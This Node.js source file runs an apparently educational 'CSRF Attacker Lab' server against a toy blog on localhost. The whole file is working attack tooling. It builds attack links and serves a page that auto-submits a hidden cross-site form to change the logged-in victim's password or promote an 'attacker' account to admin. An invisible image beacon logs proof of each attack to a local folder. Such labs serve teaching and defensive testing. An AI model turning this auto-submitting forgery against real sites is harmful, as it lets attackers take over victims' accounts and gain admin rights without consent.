const http = require('http');
const fs = require('fs');
const path = require('path');
const { URL, URLSearchParams } = require('url');

const PORT = 7001;
const VICTIM_ORIGIN = 'http://localhost:5000';
const VICTIM_LOGIN = `${VICTIM_ORIGIN}/login.html`;
const CAPTURE_DIR = path.join(__dirname, 'captures');

function send(res, status, contentType, body, headers = {}) {
  res.writeHead(status, {
    'Content-Type': contentType,
    ...headers,
  });
  res.end(body);
}

function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#039;');
}

function page(title, body) {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>${title}</title>
  <style>
    body { font-family: Arial, sans-serif; background: #111827; color: #e5e7eb; margin: 0; }
    main { max-width: 880px; margin: 32px auto; padding: 0 20px; }
    section { background: #1f2937; border: 1px solid #374151; border-radius: 8px; padding: 20px; margin-bottom: 18px; }
    h1, h2 { margin-top: 0; }
    label { display: block; margin: 14px 0; font-weight: 700; }
    input, textarea { box-sizing: border-box; display: block; width: 100%; margin-top: 6px; padding: 10px; border: 1px solid #4b5563; border-radius: 6px; background: #0f172a; color: #e5e7eb; font: inherit; }
    textarea { min-height: 110px; resize: vertical; }
    button, .button { display: inline-block; border: 0; border-radius: 6px; background: #f97316; color: white; padding: 10px 14px; font-weight: 700; text-decoration: none; cursor: pointer; }
    code, pre { background: #0f172a; border: 1px solid #374151; border-radius: 6px; }
    code { padding: 2px 5px; }
    pre { padding: 12px; overflow: auto; white-space: pre-wrap; }
    .muted { color: #cbd5e1; }
  </style>
</head>
<body>
  <main>${body}</main>
</body>
</html>`;
}

function renderIndex() {
  return page(
    'CSRF Attacker Lab',
    `<section>
      <h1>CSRF Attacker Lab</h1>
      <p class="muted">Generate a link that causes the logged-in victim browser to perform a selected action on the vulnerable victim blog.</p>
    </section>
    <section>
      <h2>Change Password</h2>
      <form method="get" action="/build">
        <input type="hidden" name="action" value="change-password">
        <label>New password <input name="newPassword" value="changed-by-csrf" required minlength="6"></label>
        <button type="submit">Change password attack link</button>
      </form>
      <p class="muted">This changes the logged-in victim account password to the value you set. It does not collect or expose the old password.</p>
    </section>
    <section>
      <h2>Make Attacker Admin</h2>
      <form method="get" action="/build">
        <input type="hidden" name="action" value="promote">
        <label>Username to promote <input name="username" value="attacker" required></label>
        <button type="submit">Promote user attack link</button>
      </form>
      <p class="muted">This demonstrates CSRF combined with broken access control in the toy app.</p>
    </section>
    <section>
      <h2>Lab Steps</h2>
      <p>1. Open <a class="button" href="${VICTIM_LOGIN}">blog-platform login</a> and log in as the victim.</p>
      <p>2. To test admin promotion, create or keep an account named <code>attacker</code> first.</p>
      <p>3. Return here and generate one of the remaining attack links.</p>
      <p>4. Open the generated link in the same browser where the victim is logged in.</p>
      <p>5. Check <code>${VICTIM_ORIGIN}</code> and the local <code>captures</code> folder.</p>
    </section>`
  );
}

function renderBuild(url) {
  const action = url.searchParams.get('action') || 'create';
  const params = new URLSearchParams({ action });

  if (action === 'change-password') {
    params.set('newPassword', url.searchParams.get('newPassword') || 'changed-by-csrf');
  } else if (action === 'promote') {
    params.set('username', url.searchParams.get('username') || 'attacker');
  } else {
    params.set('action', 'change-password');
    params.set('newPassword', 'changed-by-csrf');
  }

  const attackUrl = `http://localhost:${PORT}/go?${params.toString()}`;

  return page(
    'Attack Link Ready',
    `<section>
      <h1>Attack Link Ready</h1>
      <p class="muted">Send/open this URL in the victim browser after logging into the victim blog.</p>
      <pre>${escapeHtml(attackUrl)}</pre>
      <p><a class="button" href="${escapeHtml(attackUrl)}">Open attack URL</a></p>
    </section>`
  );
}

function renderAttack(url) {
  const attack = buildAttack(url);
  const proof = Buffer.from(JSON.stringify(attack.proof)).toString('base64url');

  return page(
    'Loading...',
    `<section>
      <h1>Loading...</h1>
      <p class="muted">The page is submitting a cross-site form to the vulnerable victim blog.</p>
      <img src="/capture?proof=${encodeURIComponent(proof)}" width="1" height="1" alt="">
      <form id="csrf" method="post" action="${VICTIM_ORIGIN}${attack.path}">
        ${attack.inputs}
      </form>
      <script>document.getElementById('csrf').submit();</script>
    </section>`
  );
}

function hiddenInput(name, value) {
  return `<input type="hidden" name="${escapeHtml(name)}" value="${escapeHtml(value)}">`;
}

function buildAttack(url) {
  const action = url.searchParams.get('action') || 'create';

  if (action === 'change-password') {
    const newPassword = url.searchParams.get('newPassword') || 'changed-by-csrf';
    return {
      path: '/api/auth/change-password',
      inputs: hiddenInput('newPassword', newPassword),
      proof: { action, changedToPassword: newPassword },
    };
  }

  if (action === 'promote') {
    const username = url.searchParams.get('username') || 'attacker';
    return {
      path: '/api/admin/promote',
      inputs: hiddenInput('username', username),
      proof: { action, promotedUsername: username },
    };
  }

  const newPassword = url.searchParams.get('newPassword') || 'changed-by-csrf';
  return {
    path: '/api/auth/change-password',
    inputs: hiddenInput('newPassword', newPassword),
    proof: { action: 'change-password', changedToPassword: newPassword },
  };
}

function recordCapture(req, url) {
  fs.mkdirSync(CAPTURE_DIR, { recursive: true });
  const proof = url.searchParams.get('proof') || '';
  let decodedProof = {};
  try {
    decodedProof = JSON.parse(Buffer.from(proof, 'base64url').toString('utf8'));
  } catch {
    decodedProof = { note: 'invalid proof payload' };
  }

  const capture = {
    capturedAt: new Date().toISOString(),
    remoteAddress: req.socket.remoteAddress,
    userAgent: req.headers['user-agent'] || null,
    proof: decodedProof,
    sensitiveDataCollected: false,
    note: 'Training capture only. This lab never records old passwords, cookies, or tokens.',
  };

  const file = path.join(CAPTURE_DIR, `csrf-proof_${Date.now()}.json`);
  fs.writeFileSync(file, `${JSON.stringify(capture, null, 2)}\n`);
}

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);

  if (req.method === 'GET' && url.pathname === '/') {
    return send(res, 200, 'text/html', renderIndex());
  }

  if (req.method === 'GET' && url.pathname === '/build') {
    return send(res, 200, 'text/html', renderBuild(url));
  }

  if (req.method === 'GET' && url.pathname === '/go') {
    return send(res, 200, 'text/html', renderAttack(url));
  }

  if (req.method === 'GET' && url.pathname === '/capture') {
    recordCapture(req, url);
    return send(res, 204, 'text/plain', '');
  }

  return send(res, 404, 'text/plain', 'Not found');
});

server.listen(PORT, () => {
  console.log(`Attacker lab running at http://localhost:${PORT}`);
});
